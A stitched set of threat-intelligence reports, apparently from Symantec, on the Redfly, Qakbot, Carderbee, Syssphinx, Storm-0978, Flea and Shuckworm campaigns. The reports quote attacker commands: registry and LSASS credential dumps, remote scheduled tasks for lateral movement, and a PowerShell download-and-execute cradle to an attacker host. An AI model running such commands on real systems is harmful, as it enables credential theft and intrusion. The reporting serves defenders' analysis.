SERVICE_AUTO_START BinaryPathName: C:\\ProgramData\\VMware\\RawdskCompatibility\\virtual\\vmrawdsk.exe This is a tool used to load and execute shellcode. The shellcode is stored in a file in an encrypted form. It allows the attackers to deliver and execute arbitrary files or commands on an infected computer. The tool is a 64-bit dynamic link library (DLL) that has one export, called WorkProc, which accepts an additional command-line argument. This argument is interpreted as a string and can be used as a decryption key. If no key is passed on the command line, the malware attempts to retrieve a key from the following registry location instead: In all cases, the malware checks that the string length of the decryption secret is 0x20 characters. The malware then loads its payload. It will first check if the following file exists: If the file exists, its contents are used as the encrypted payload. Otherwise, the malware attempts to retrieve a payload from the registry at the following location: The malware will then decrypt the loaded payload with the Advanced Encryption Standard (AES) algorithm in Electronic Code Book (ECB) mode using the first 0x10 bytes of the decryption key as the AES key. Finally, it creates a new thread to execute the decrypted payload as shellcode. The attackers also employed a keylogger, which was installed under various file names on different computers, including winlogon.exe and hphelper.exe. The keylogger was configured to store captured keystrokes in the following location: The first evidence of intrusion on the targeted network dated from February 28, 2023, when ShadowPad was executed on a single computer. It was executed again on May 17 2023, suggesting that the attackers had maintained a presence in the intervening three months. A day earlier (May 16), a suspicious Windows batch file (file name: 1.bat) was executed. Shortly afterwards, PackerLoader was executed via rundll32 from the %TEMP% directory with some command-line arguments: rundll32 %TEMP\\%packerloader.dll WorkProc E10ADC3949BA59ABBE56E057F20F883E Immediately afterwards, permissions were modified for a driver file called dump_diskfs.sys to grant access to all users. It is possible the attackers used this driver to create dumps of the file system for later exfiltration. Four minutes later, credentials were dumped from the Windows registry: reg save HKLM\\SYSTEM system.save reg save HKLM\\SAM sam.sav reg save HKLM\\SECURITY security.save On May 19, the attackers returned, running PackerLoader and the 1.bat batch file again. Shortly afterwards, a legitimate binary named displayswitch.exe was executed. It was likely being used to perform DLL side-loading. This involves the attackers placing a malicious DLL in a directory where a legitimate DLL is expected to be found. The attacker then runs the legitimate application (having installed it themselves). The legitimate application then loads and executes the payload. Several hours later a suspicious PowerShell command was executed and used to gather information on the storage devices attached to the system. Specifically it was designed to look for DriveType=3 (Read/Write Supported) and gather details on available space. powershell -executionpolicy ByPass -command \"$disks = Get-WmiObject Win32_LogicalDisk -Filter \\\" DriveType = 3\\\" ; foreach ($disk in $disks) { $freeSpace = \\\"{0:N2}\\\" -f ($disk. FreeSpace/1GB) ; Write-Host \\\"Drive Free Space: $($disk. DeviceID) $freeSpace\\\"; }\" Several hours later, a similar set of activity occurred again. On May 26, displayswitch.exe was executed from the %TEMP% directory via the command prompt. Less than an hour later, several commands were executed via displayswitch.exe to dump credentials from the registry and clear the Windows security event logs: reg save HKLM\\SAM sam.save reg save HKLM\\SYSTEM system.save reg save HKLM\\SYSTEM system.save reg save HKLM\\SYSTEM system.save reg save HKLM\\SECURITY security.save reg save HKLM\\SAM sam.save reg save HKLM\\SECURITY security.save On May 29, the attackers returned and used a renamed version of ProcDump (file name: alg.exe) to dump credentials from LSASS. alg.exe -accepteula -ma lsass.exe z1.dmp On May 31, a scheduled task is used to execute oleview.exe, mostly likely to perform side-loading and laterally movement. Use of Oleview by ShadowPad has beenpreviously documented by Dell Secureworksand was also reported to have been used in attacks against industrial control systems. The command specified that Oleview was to be executed on a remote machine using the task name (TendView) at 07:30 a.m. It appears the attackers likely used stolen credentials in order to spread their malware onto other machines within the network. schtasks /create /s \\\\[REMOVED] /u [REMOVED] /P [REMOVED] /tr \"CSIDL_PROFILE\\[REMOVED]\\appdata\\local\\temp\\oleview.exe\" /tn TrendView /st 07:30 /sc once /ru \" \" /f Malicious activity appeared to cease until July 27, when a keylogger (file name: winlogon.exe) was installed on a machine. The final evidence of malicious activity came on August 3, when the attackers returned and attempted to dump credentials again using a renamed version of ProcDump (file name: yara32.exe): yara32.exe -accepteula -ma lsass.exe z1.dmp Minutes later, the attackers also attempted to dump credentials from the Windows registry: reg save HKLM\\SAM sam.save reg save HKLM\\SAM sam.save reg save HKLM\\SYSTEM system.save reg save HKLM\\SYSTEM system.save reg save HKLM\\SYSTEM system.save reg save HKLM\\SECURITY security.save reg save HKLM\\SECURITY security.save Attacks against CNI targets are not unprecedented. Almost a decade ago,Symantec uncovered the Russian-sponsored Dragonfly group’s attacksagainst the energy sectors in the U. S. and Europe. More recently, the Russian Sandworm group mounted attacks against the electricity distribution network in Ukraine, which were directed at disrupting electricity supplies. However, the frequency at which CNI organizations are being attacked appears to have increased over the past year and is now a source of concern. Threat actors maintaining a long-term, persistent presence on a national grid presents a clear risk of attacks designed to disrupt power supplies and other vital services in nation-states during times of increased political tension. While Symantec has not seen any disruptive activity by Redfly, the fact that such attacks have occurred in other regions means they are not outside the bounds of possibility.

    "text": "A major international law enforcement operation has disrupted the notorious Qakbot botnet and taken much of its infrastructure offline. Led by the U. S. Federal Bureau of Investigation (FBI) and Justice Departmentand involving agencies from France, Germany, the Netherlands, the UK, Romania, and Latvia, the operation has resulted in the deletion of the Qakbot malware from more than 700,000 victim’s computers and the seizure of $8.6 million in cryptocurrency that is suspected to be the profit of cybercrime. The takedown operation saw the FBI obtaining access to Qakbot infrastructure, which allowed it to identify more than 700,000 infections and redirect the botnet’s traffic to servers controlled by the agency. An uninstaller was then distributed that removed the infected computers from the botnet. Qakbot is operated by a cybercrime group Symantec, part of Broadcom, calls Batbug. The malware is one of the most enduring threats, having first appeared in 2007. Like several similar malware families, Qakbot started life as a banking Trojan and, aside from its prevalence, it became known for its functionality and adaptability. For example, once it infected one machine in an organization, it was able to spread laterally across networks utilizing a worm-like functionality through brute-forcing network shares and Active Directory user group accounts, or via server message block (SMB) exploitation. Qakbot is largely spread via email. While it was once delivered by the Emotet botnet, Qakbot is now usually delivered directly via email spam runs, suggesting its operators acquired access to spamming infrastructure following Emotet’s disappearance. These emails may include a malicious link or attachment, and the subject lines generally refer to popular lure subjects such as shipping updates, work orders, urgent requests, invoices, and claims. In recent years, Qakbot has become closely associated with ransomware activity with Qakbot infections acting as the initial breach that ultimately leads to ransomware deployment on an organization’s network. Qakbot has been associated with multiple ransomware operations in recent years, including Sodinokibi, Egregor, ProLock, and MountLocker. Most recently, it has been seen collaborating with the BlackBasta ransomware operation. Activity by Qakbot stepped up significantly from January 2023, when its malicious emails leveraged Microsoft OneNote attachments to drop Qakbot on infected machines. OneNote is a desktop digital notebook application that is installed by default in all Microsoft Office/365 installations. Even if a Windows user does not typically use the application, it is still available to open the file format. The malicious emails contained an embedded URL. When clicked, it leads to a ZIP archive that contains a malicious OneNote file. Clicking on this file leads to the execution of an HTML Application (HTA) file that ultimately leads to a Qakbot DLL being downloaded onto a victim’s machine. It is downloaded as a .png file via curl before being loaded by rundll32.exe. There were indications in at least one Qakbot attack observed by Symantec that the initial access vector may have been malvertising. The attack chain in that instance began with the victim visiting a malicious website on the Chrome browser. This coincided with reports about malware, including IcedID, being spread via ads on Google. This surge in Qakbot activity appeared to last until June 2023. The attackers made frequent tweaks to their attack chain, likely in a bid to evade detection. OneNote files were eventually abandoned and by June the attackers were largely favoring PDF documents, which led to URLs from which malicious ZIP archives containing JavaScript downloaders were downloaded. It is unclear yet whether Qakbot's sudden cessation of activity in June was linked to this takedown operation. Batbug has long been one of the largest players in the cybercrime landscape, controlling a lucrative malware distribution network that was linked to multiple major ransomware gangs. This takedown is likely to disrupt Batbug’s operations and it is possible that the group may struggle to rebuild its infrastructure in its aftermath.

    "text": "12.20pm BST, 22 August 2023: Updated with additional IoCs A previously unknown advanced persistent threat (APT) group used the legitimate Cobra DocGuard software to carry out a supply chain attack with the goal of deploying the Korplug backdoor (aka PlugX) onto victim computers. In the course of this attack, the attackers used malware signed with a legitimate Microsoft certificate. Most of the victims in this campaign are based in Hong Kong, with some victims based in other regions of Asia. Korplug is known to be used by multiple APT groups, but we could not link this activity to a known threat actor so we have given the actor behind this activity a new name — Carderbee. Cobra DocGuard Client is software produced by a China-based company called EsafeNet and appears to legitimately be used to protect, encrypt, and decrypt software. EsafeNet is owned by Chinese information security firm NSFOCUS. According to a report from ESET, in September 2022, a malicious update to this software was used to compromise a gambling company in Hong Kong. The same gambling company had been compromised in September 2021 using the same technique by Budworm (aka LuckyMouse, APT27), which led ESET to attribute this September 2022 attack to Budworm too. In that attack, a new variant of the Korplug malware was also found. In that instance, it used the magic header “ESET”, indicating that it may have been modified to try to bypass ESET products. A signed version of Korplug was also used in the activity investigated by the Symantec Threat Hunter Team, part of Broadcom. This activity began in April 2023. However, we did not find any other evidence to indicate that this attack was carried out by Budworm. Korplug is a backdoor that is known to be used by multiple APTs, including APT41 and Budworm. We do not have any indication of the industry sectors of the companies targeted in this recent activity, just their geographic location. Accordingly, it was not possible to link this activity definitively to a known group, which is why we attributed it to a new group, Carderbee. Malicious activity was seen on about 100 computers in impacted organizations; however, the Cobra DocGuard software was installed on around 2,000 computers, indicating that the attacker may be selectively pushing payloads to specific victims. The malicious software was delivered to the following location on infected computers, which is what indicates that a supply chain attack or malicious configuration involving Cobra DocGuard is how the attackers compromised affected computers: \"csidl_system_drive\\program files\\esafenet\\cobra docguard client\\update\" Over a period of a few months in 2023, multiple distinct malware families were observed being deployed via this method. In one interesting case, a downloader deployed by the attackers had a digitally signed certificate from Microsoft, called Microsoft Windows Hardware Compatibility Publisher. This downloader was used to install the Korplug backdoor on targeted systems. The downloader attempted to download a file named update.zip from the following location:http://cdn.stream-amazon[.]com/update.zip. The update.zip file is a zlib compressed archive file. It decompresses and executes a file named content.dll. This file is not saved on disk. It acts as a dropper and contains x64 and x86 drivers, which are dropped depending on the system environment. The dropper creates services and registry entries. The dropped drivers read encrypted data from the registry, decrypt it, and inject it into svchost.exe. The injected payload is the Korplug backdoor. The Korplug sample downloaded here is able to: Use of Microsoft-signed malwareis a known problem. In December 2022,Mandiant noteda POORTRY driver sample signed with a Microsoft Windows Hardware Compatibility Authenticode signature. Most recently, in July 2023,Trend saidthat it had found a Microsoft-signed rootkit that appeared to have passed through the Windows Hardware Quality Labs (WHQL) process for getting a valid signature. Microsoftacknowledged the issueand said that drivers certified by Microsoft’s Windows Hardware Developer Program (MWHDP) were being used maliciously in post-exploitation activity. The company said it had investigated the issue and “determined that the activity was limited to the abuse of several developer program accounts and that no Microsoft account compromise has been identified.” Malware signed with what appears to be a legitimate certificate can make it much harder for security software to detect. It seems clear that the attackers behind this activity are patient and skilled actors. They leverage both a supply chain attack and signed malware to carry out their activity in an attempt to stay under the radar. The fact that they appear to only deploy their payload on a handful of the computers they gain access to also points to a certain amount of planning and reconnaissance on behalf of the attackers behind this activity. Software supply chain attacks remain a major issue for organizations in all sectors, with multiple high-profile supply chain attacks occurring in the last 12 months, including theMOVEit,X_Trader, and3CX attacks. Some unanswered questions remain about the activity of Carderbee, such as what sectors the group was targeting with this activity, and whether there are any links between Carderbee and other actors such as Budworm. Symantec researchers will continue to track this activity, and we share indicators of compromise below so our colleagues in the security community can do so as well.

    "text": "Symantec’s Threat Hunter Team, a part ofBroadcom, recently observed the Syssphinx (aka FIN8) cyber-crime group deploying a variant of the Sardonic backdoor to deliver the Noberus ransomware. While analysis of the backdoor revealed it to be part of the Sardonic framework previously used by the group, and analyzed in a2021 report from Bitdefender, it seems that most of the backdoor’s features have been altered to give it a new appearance. Active since at least January 2016, Syssphinx (aka FIN8) is a financially motivated cyber-crime group known for targeting organizations in the hospitality, retail, entertainment, insurance, technology, chemicals, and finance sectors. The group is known for utilizing so-called living-off-the-land tactics, making use of built-in tools and interfaces such as PowerShell and WMI, and abusing legitimate services to disguise its activity. Social engineering and spear-phishing are two of the group’s preferred methods for initial compromise. While Syssphinx initially specialized in point-of-sale (POS) attacks, in the past few years the group has been observed using a number of ransomware threats in its attacks. In June 2021, Syssphinx was seen deploying the Ragnar Locker ransomware onto machines it had compromised in a financial services company in the U. S. earlier in the year. The activity marked the first time the group was observed using ransomware in its attacks. Ragnar Locker is developed by a financially motivated cyber-crime group Symantec calls Hornworm (aka Viking Spider). In January 2022, a family of ransomware known as White Rabbit was linked to Syssphinx. A malicious URL linked to White Rabbit attacks was alsolinked to Syssphinx. In addition, attacks involving White Rabbit used a variant of the Sardonic backdoor, a known Syssphinx tool. In December 2022, Symantec observed the group attempting to deploy theNoberus(aka ALPHV, BlackCat) ransomware in attacks. Noberus is operated by a financially motivated cyber-crime group Symantec calls Coreid (aka Blackmatter, Carbon Spider, FIN7). The Syssphinx group’s move to ransomware suggests the threat actors may be diversifying their focus in an effort to maximize profits from compromised organizations. Syssphinx is known for taking extended breaks between attack campaigns in order to improve its tactics, techniques, and procedures (TTPs). For instance, since 2019, Syssphinx had used backdoor malware called Badhatch in attacks. Syssphinx updated Badhatch in December 2020 and then again in January 2021. Then in August 2021, Bitdefender researcherspublished detailsof a new backdoor dubbed Sardonic and linked it to the same group. The C++-based Sardonic backdoor has the ability to harvest system information and execute commands, and has a plugin system designed to load and execute additional malware payloads delivered as DLLs. The Syssphinx attack observed by Symantec in December 2022, in which the attackers attempted to deploy the Noberus ransomware, involved similar techniques as a Syssphinx attackdescribed by Bitdefender researchers in 2021. However, the most recent attack had some key differences, including the final payload being the Noberus ransomware and the use of a reworked backdoor. The revamped Sardonic backdoor analyzed in this blog shares a number of features with the C++-based Sardonic backdoor analyzed by Bitdefender. However, most of the backdoor’s code has been rewritten, such that it gains a new appearance. Interestingly, the backdoor code no longer uses the C++ standard library and most of the object-oriented features have been replaced with a plain C implementation. In addition, some of the reworkings look unnatural, suggesting that the primary goal of the threat actors could be to avoid similarities with previously disclosed details. For example, when sending messages over the network, the operation code specifying how to interpret the message has been moved after the variable part of the message, a change that adds some complications to the backdoor logic. This goal seemed limited to just the backdoor itself, as known Syssphinx techniques were still used. During the December 2022 incident, the attackers connected with PsExec to execute the command “quser” in order to display the session details and then the following command to launch the backdoor: powershell.exe -nop -ep bypass -c iex (New-Object System. Net. WebClient). DownloadString('https://37-10-71-215[.]nip[.]io:8443/7ea5fa') Next, the attackers connected to the backdoor to check details of the affected computer before executing the command to establish persistence. powershell -nop -ep bypass -c CSIDL_WINDOWS\\temp\\1.ps1 2BDf39983402C1E50e1d4b85766AcF7a This resulted with a process similar to that described by Bitdefender. powershell.exe -nop -c [System. Reflection. Assembly]::Load(([WmiClass] 'root\\cimv2:System__Cls'). Properties['Parameter']. Value);[a8E95540.b2ADc60F955]::c3B3FE9127a() The next day, the attackers connected to the persistent backdoor, but paused after running a few basic commands. Roughly 30 minutes later, the activity resumed with the attackers using what looked like wmiexec.py from Impacket, which started a process to launch a new backdoor. cmd.exe /Q /c powershell -nop -ep bypass -c CSIDL_SYSTEM_DRIVE\\shvnc.ps1 1> \\\\127.0.0.1\\ADMIN$\\__1671129123.2520242 2>&1 This new backdoor was used by the attackers for the next few hours. Interestingly, the new backdoor PowerShell script uses a new file name and simplifies the command-line by removing the decryption key argument. Switching the tools like this could indicate that the attackers are testing new features, so we were curious to analyze this new sample in detail. One difference between the attack described by Bitdefender and the recent attacks observed by Symantec is the technique used to deploy the backdoor. In our case, the backdoor is embedded (indirectly) into a PowerShell script (see Figure 1) used to infect target machines, while the variant documented by Bitdefender features intermediate downloader shellcode that downloads and executes the backdoor. The PowerShell script used by Syssphinx can be seen in Figure 2. The intention of the first line of code is to delete the PowerShell script file itself. The second line checks the architecture of the current process and picks the 32-bit or 64-bit version of the encoded . NET Loader as appropriate. The third line decodes the . NET Loader binary and loads it into the current process. Finally, the fourth line of code starts the main functionality of the . NET Loader, where the injector and backdoor are decrypted and control is passed to the injector. The . NET Loader is an obfuscated . NET DLL. The obfuscation manifests certain ConfuserEx features. The . NET Loader contains two blobs, which it first decrypts with the RC4 algorithm using a hardcoded decryption key before decompressing. The decompressed blobs are then copied into a continuous chunk of memory. The . NET Loader then transfers control to the second blob (injector), passing the memory location and size of the first blob (backdoor) as parameters. The injector is in the form of shellcode and its entrypoint is shown in Figure 3. The decrypt_dwords subroutine seen in Figure 3 decrypts a few dwords (marked as encrypted_dwords in Figure 3) to reveal a short chunk of code. The revealed code is shown in Figure 4 and includes a decryption loop that looks similar to the “shellcode decryption routine” described in Bitdefender’s report. After the decryption loop completes execution, we can see the full logic of the entrypoint (Figure 5). The purpose of the injector is to start the backdoor in a newly created WmiPrvSE.exe process. When creating the WmiPrvSE.exe process, the injector attempts to start it in session-0 (best effort) using a token stolen from the lsass.exe process. The Backdoor is also in the form of shellcode and its entrypoint looks similar to that of the injector entrypoint, with the exception of polymorphism. One of the interesting features of the backdoor is related to interactive sessions, where the attacker runs cmd.exe or other interactive processes on the affected computer. Interestingly, the sample allows up to 10 such sessions to run at the same time. In addition, when starting each individual process, the attacker may use a process token stolen from a specified process ID that is different for each session. Another notable feature is that the backdoor supports three different formats to extend its functionality. The first is with PE DLL plugins that the backdoor loads within its own process and then calls: The second format supported by the backdoor is in the form of shellcode, where each shellcode plugin executes in its own dedicated process. Before starting the shellcode, the backdoor creates a new process and writes into its memory the shellcode blob preceded by a simple structure storing a copy of arguments received from the remote attacker. It then uses the QueueUserAPC API to execute the shellcode, such that the address of the mentioned structure is passed as the first and only shellcode argument. To unload any shellcode plugin, the backdoor simply terminates the process associated with the specified plugin. Finally, the third format is also in the form of shellcode but with a different convention to pass the arguments. The backdoor executes this shellcode in the context of the backdoor's main thread and no other commands are accepted until the shellcode returns. To execute the shellcode, the backdoor simply calls it as a subroutine passing four arguments, each providing the address of the corresponding argument received from the remote attacker (the backdoor appears to use 64-bit values when passing the addresses in case of 32-bit shellcode). Network communication When communicating with its command-and-control (C&C) server, the backdoor exchanges messages of variable size using the structure shown in Table 1. The size of body field (body_size) can be determined from the content of the header field as explained in the following sections. Once the backdoor connects to its C&C server, it sends the initial message of 0x10C bytes with: The body field of the initial message is 0x100 bytes and uses the structure shown in Table 2. The size of rc4_key filed (rc4_key_size) is always 0x40 bytes. The snippet shown below roughly demonstrates the method used by the backdoor to generate the infection_id. uint16_t sum_words(void *data, size_t size) uint16_t *words = data; while (size >= sizeof(*words)) { size -= sizeof(*words); void mix(char *identifier, size_t identifier_size, char *seed, size_t seed_length) const char hex_digits[] = \"0123456789ABCDEF\"; for (size_t position = 1; position < identifier_size; position += 2) { int value = index * ~( seed[(index - 1) % seed_length] + seed[(index % identifier_size) % seed_length] + seed[((index + 1) % identifier_size) % seed_length] + seed[((index + 2) % identifier_size) % seed_length] identifier[position - 1] = hex_digits[(value >> 4) & 0x0f]; identifier[position] = hex_digits[value & 0x0f]; void generate_infection_id(char *infection_id, size_t infection_id_size) CHAR computer_name[0x400] = {}; DWORD computer_name_size = sizeof(computer_name); GetComputerNameA(computer_name, &computer_name_size); int cpu_info[4] = {}; __cpuid(cpu_info, 0); DWORD volume_serial_number = 0; GetVolumeInformationA(\"c:\\\\\", 0, 0, &volume_serial_number, 0, 0, 0, 0); size_t seed_length = snprintf(seed, sizeof(seed), \"%s%hu%hu\", sum_words(cpu_info, sizeof(cpu_info)), sum_words(&volume_serial_number, sizeof(volume_serial_number))); mix(infection_id, infection_id_size, seed, seed_length); For all the communication that follows (incoming and outgoing), the backdoor uses the following method to determine the size of the body field (body_size): The content of body and footer fields is encrypted with the RC4 algorithm using rc4_key as the encryption key. The keystream is reused when encrypting each individual field. The footer field is 8 bytes and, once decrypted, uses the structure shown in Table 3. Finally, the structure of the decrypted body field varies depending on the message_type. The backdoor has the ability to receive and carry out the commands listed in Table 4. Syssphinx continues to develop and improve its capabilities and malware delivery infrastructure, periodically refining its tools and tactics to avoid detection. The group’s decision to expand from point-of-sale attacks to the deployment of ransomware demonstrates the threat actors’ dedication to maximizing profits from victim organizations. The tools and tactics detailed in this report serve to underscore how this highly skilled financial threat actor remains a serious threat to organizations.

    "text": "A zero-day vulnerability (CVE-2023-36884) affecting Microsoft Windows and Office products is being exploited by attackers in the wild. To date, the exploit has been used in highly targeted attacks against organizations in the government and defense sectors in Europe and North America. The vulnerabilitywas disclosed yesterday (July 11) by Microsoft, which said that an attacker could create a specially crafted Microsoft Office document that enables remote code execution on the target’s computer. In order for the exploit to succeed, the victim needs to open the malicious file. No patch has been released yet for the vulnerability. However, Microsoft is still investigating the issue and said a patch may be rolled out in its monthly release process or in an out-of-cycle security update. The company provided some mitigation guidance in its advisory. How is the vulnerability being exploited? According to aseparate blog published by Microsoft, the vulnerability was being exploited by an actor it calls Storm-0978 (aka RomCom) in targeted attacks against defense and government organizations in Europe and North America. The exploit was contained in Microsoft Word documents that masqueraded as information about the Ukrainian World Congress. The attacks wereearlier documented by BlackBerryon July 8, which noted that the targets were guests for the upcoming NATO Summit. At the time, the use of the zero-day in the attacks was unknown. Who is Storm-0978/RomCom? Storm-0978/RomCom is a Russia-linked threat actor that has been involved in both espionage and cyber-crime activity. The group acquired its name through its use of the RomCom remote access Trojan (RAT). There are strong ties between it and a group Symantec calls Hawker, which is the developer of the Cuba ransomware family. TheU. S Cybersecurity and Infrastructure Security Agency (CISA) has saidthat there are possibly links between Hawker, RomCom, and the Industrial Spy ransomware actors. Areport published last year by Palo Altoalso detailed how RomCom (whom it calls Tropical Scorpius) used the RomCom RAT to deliver the Cuba ransomware payload to victims. While it is clear that there are strong ties between Storm-0978/RomCom and Hawker, it is unclear yet whether the two actors are one and the same. How severe is this vulnerability? Until a patch is released, organizations should adopt all possible mitigation strategies. Although the vulnerability has, to date, been exploited in targeted attacks, news of its existence will doubtlessly lead other attackers to attempt to replicate the exploit. Symantec is continuing to investigate further possible protection based on available information, and additional signatures may be introduced as analysis progresses.

    "text": "The Flea (aka APT15, Nickel) advanced persistent threat (APT) group continued to focus on foreign ministries in a recent attack campaign that ran from late 2022 into early 2023 in which it leveraged a new backdoor called Backdoor. Graphican. This campaign was primarily focused on foreign affairs ministries in the Americas, although the group also targeted a government finance department in a country in the Americas and a corporation that sells products in Central and South America. There was also one victim based in a European country, which was something of an outlier. This victim had also previously suffered a seemingly unrelated ransomware attack in July 2022. However, the primary focus of the campaign observed by the Threat Hunter Team at Symantec, part of Broadcom, does appear to be on ministries of foreign affairs in the Americas. Flea has a track record of honing in on government targets, diplomatic missions, and embassies, likely for intelligence-gathering purposes. Flea used a large number of tools in this campaign. As well as the new Graphican backdoor, the attackers leveraged a variety of living-off-the-land tools, as well as tools that have been previously linked to Flea. We will detail these tools in this section. Graphican is an evolution of the known Flea backdoor Ketrican, which itself was based on a previous malware — BS2005 — also used by Flea. Graphican has the same basic functionality as Ketrican, with the difference between them being Graphican’s use of the Microsoft Graph API and OneDrive to obtain its command-and-control (C&C) infrastructure. This technique was used in a similar way by the Russian state-sponsored APT groupSwallowtail (aka APT28, Fancy Bear, Sofacy, Strontium) in a campaign in 2022in which it delivered the Graphite malware. In that campaign, the Graphite malware used the Microsoft Graph API and OneDrive as a C&C server. The observed Graphican samples did not have a hardcoded C&C server, rather they connected to OneDrive via the Microsoft Graph API to get the encrypted C&C server address from a child folder inside the \"Person\" folder. The malware then decoded the folder name and used it as a C&C server for the malware. All instances of this variant used the same parameters to authenticate to the Microsoft Graph API. We can assume they all have the same C&C, which can be dynamically changed by the threat actors. Once on a machine, Graphican does the following: Commands that can be executed by Graphican include: During the course of this campaign, we also observed an updated version of Ketrican, which had a hardcoded C&C server and only implemented the ‘C’, ‘U’, and ‘D’ commands. We also saw an older version of Ketrican (compiled in 2020) that implemented only the ‘N’ and ‘P’ commands. This demonstrates that the group is actively developing and adapting Ketrican to suit its objectives. Other tools leveraged by Flea in this recent activity include: Flea has been in operation since at least 2004. Over that time its tactics, techniques, and procedures (TTPs), as well as its targeting, have changed and developed. In recent years, the group has primarily focused on attacks against government organizations, diplomatic entities, and non-governmental organizations (NGOs) for the purposes of intelligence gathering. North and South America does appear to have become more of a focus for the group in recent times, which aligns with the targeting we saw in this campaign. The goal of the group does seem to be to gain persistent access to the networks of victims of interest for the purposes of intelligence gathering. Its targets in this campaign, of ministries of foreign affairs, also point to a likely geo-political motive behind the campaign. Flea traditionally used email as an initial infection vector, but there have also been reports of it exploiting public-facing applications, as well as using VPNs, to gain initial access to victim networks. Microsoft seized domains belonging to Fleain December 2021. The company seized 42 domains that it said were used in operations that targeted organizations in the U. S. and 28 other countries for intelligence-gathering purposes. Flea was also linked in a November 2022 report by Lookout to along-running campaign targeting Uyghur-language websites and social mediain China. Flea is believed to be a large and well-resourced group, and it appears that exposure of its activity, and even takedowns such as that detailed by Microsoft, have failed to have a significant impact when it comes to stopping the group’s activity. The use of a new backdoor by Flea shows that this group, despite its long years of operation, continues to actively develop new tools. The group has developed multiple custom tools over the years. The similarities in functionality between Graphican and the known Ketrican backdoor may indicate that the group is not very concerned about having activity attributed to it. The most noteworthy thing about Graphican itself is the abuse of the Microsoft Graph API and OneDrive to obtain its C&C server. The fact that a similar technique was used by Swallowtail, an unconnected APT group operating out of a different region, is also worth noting. Once a technique is used by one threat actor, we often see other groups follow suit, so it will be interesting to see if this technique is something we see being adopted more widely by other APT groups and cyber criminals. Flea’s targets — foreign ministries — are also interesting; though they do align with the targets the group has directed its activity at in the past. It appears the Flea’s interests remain similar to what they have been in recent years, even as its tools and techniques continue to evolve.

    "text": "The Shuckworm espionage group is continuing to mount multiple cyber attacks against Ukraine, with recent targets including security services, military, and government organizations. In some cases, Shuckworm has succeeded in staging long-running intrusions, lasting for as long as three months. The attackers repeatedly attempted to access and steal sensitive information such as reports about the deaths of Ukrainian military service members, enemy engagements and air strikes, arsenal inventories, military training, and more. In a bid to stay ahead of detection, Shuckworm has repeatedly refreshed its toolset, rolling out new versions of known tools and short-lived infrastructure, along with new additions, such as USB propagation malware. Shuckworm (aka Gamaredon, Armageddon) is a Russia-linked group that has almost exclusively focused its operations on Ukraine since it first appeared in 2014. Ukrainian officials have publicly stated that the group operates on behalf of the Russian Federal Security Service (FSB). Shuckworm is known to use phishing emails as an initial infection vector, in order to gain access to victim machines and distribute malware. The attackers send emails with malicious attachments to Ukrainian victims, with the attachments of various file types, such as: The victim lures we observed related to armed conflicts, criminal proceedings, combating crime, and protection of children, among others. Once victims were infected, the attackers then proceed to download additional backdoors and tools onto targeted machines. Shuckworm has also been observed using a new PowerShell script in order to spread its custom backdoor malware, Pterodo, via USB. Researchers from Symantec, part of Broadcom,blogged about Backdoor. Pterodo in April 2022, documenting how we had found four variants of the backdoor with similar functionality. The variants are Visual Basic Script (VBS) droppers that will drop a VBScript file, use Scheduled Tasks (shtasks.exe) to maintain persistence, and download additional code from a command-and-control (C&C) server. Examples of recent scheduled tasks include execution of the following command lines: The new PowerShell script is used to first copy itself onto the infected machine and create a shortcut file using anrtk.lnkextension. The script uses file names such as “porn_video.rtf.lnk”, “do_not_delete.rtf.lnk”” and “evidence.rtf.lnk” in an attempt to entice individuals to open the files. These file names are generally in Ukrainian, but some are also in English. Next, the script enumerates all drives, copying itself to any available removable disks – USB drives. These USB drives are likely used by the attackers for lateral movement across victim networks and may be used to help the attackers reach air-gapped machines within targeted organizations. In this recent activity, we also observed the group leveraging legitimate services to act as C&C servers, including using the Telegram messaging service for its C&C infrastructure. More recently, they have also used Telegram’s micro-blogging platform, called Telegraph, to store C&C addresses. Shuckworm tends to only use its C&C infrastructure for short periods of time, limiting the usefulness of its C&Cs when it comes to finding more activity or linking activity together. However, the group does use SSL certificates that have some commonalities that may be leveraged for tracking purposes. We believe the group is likely leveraging pre-configured images for use in its C&C deployment. These data points can help researchers to identify additional C&C infrastructure and Shuckworm activity. Symantec also saw what was likely Giddome, an infostealer tool that is a known Shuckworm backdoor, deployed onto victim networks to steal and exfiltrate data of interest. The following describes a typical attack chain seen on a victim machine compromised by Shuckworm in this campaign. In one attack, the first sign of malicious activity was when the user appeared to open a RAR archive file that was likely delivered via a spear-phishing email and which contained a malicious document. After the document was opened, a malicious PowerShell command was observed being executed to download the next-stage payload from the attackers’ C&C server: More recently, Symantec has observed Shuckworm leveraging more IP addresses in their PowerShell scripts. This is likely an attempt to evade some tracking methods employed by researchers. Shuckworm also continues to update the obfuscation techniques used in its PowerShell scripts in an attempt to avoid detection, with up to 25 new variants of the group’s scripts observed per month between January and April 2023. Next, a VBS script, which was Shuckworm’s Pterodo backdoor, was executed: Following this, we saw what appeared to be multiple similar scripts being executed. The machine used for this activity appeared to contain multiple confidential documents related to Ukrainian security services or government departments. On a different machine, we saw malicious activity that appeared to be executed from a file (foto.safe) that had been dropped by an infected USB key that someone had plugged into the system. Symantec observed multiple file paths present on infected machines that indicate users had plugged in an infected USB key e.g. \"usb-накопитель\" translates as \"usb-drive\". The foto.safe file is a Base64-encoded script. Decoded it looks like the following: fUNCtIon sET-lnK ($chILd) { $nAMetxt = \"foto.sAfe\".

Symantec has identified multiple variants of this script that can be used to indicate successful infection, or to download additional tools onto infected machines. One of the most significant things about this campaign is the targets, which include Ukrainian military, security, research, and government organizations. The attackers were observed focusing on machines that contained what appeared from file names to be sensitive military information that may be abused to support Russian kinetic war efforts. The majority of these attacks began in February/March 2023, with the attackers maintaining a presence on some of the victim machines until May. The sectors and nature of the organizations and machines targeted may have given the attackers access to significant amounts of sensitive information. There were indications in some organizations that the attackers were on the machines of the organizations’ human resources departments, indicating that information about individuals working at the various organizations was a priority for the attackers, among other things. This activity demonstrates that Shuckworm’s relentless focus on Ukraine continues. It seems clear that Russian nation-state-backed attack groups continue to prioritize high-value Ukrainian targets in attempts to find data that may potentially help their military operations.

